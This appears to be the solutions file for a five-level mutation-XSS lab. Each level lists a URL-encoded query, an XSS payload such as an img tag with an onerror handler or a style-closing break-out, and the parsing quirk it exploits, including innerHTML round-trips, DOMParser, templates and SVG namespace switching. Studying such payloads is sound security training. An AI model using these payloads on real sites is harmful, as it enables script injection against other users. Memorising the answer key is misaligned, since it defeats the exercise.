# mxss — solutions

Mutation XSS via innerHTML round-trip / DOMParser / template / namespace switching.

### mxss-level1

`/mxss/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: query interpolated into JS string then innerHTML round-trip

### mxss-level2

`/mxss/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: DOMParser parses then re-serialize into innerHTML

### mxss-level3

`/mxss/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: template.content cloned then wrapper.innerHTML → output.innerHTML

### mxss-level4

`/mxss/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: foreignObject SVG→HTML namespace switch, innerHTML of svg element

### mxss-level5

`/mxss/level5/?query=%3C/style%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `</style><img src=x onerror=alert(1)>`
- context: math+style parsing differential; close style then inject
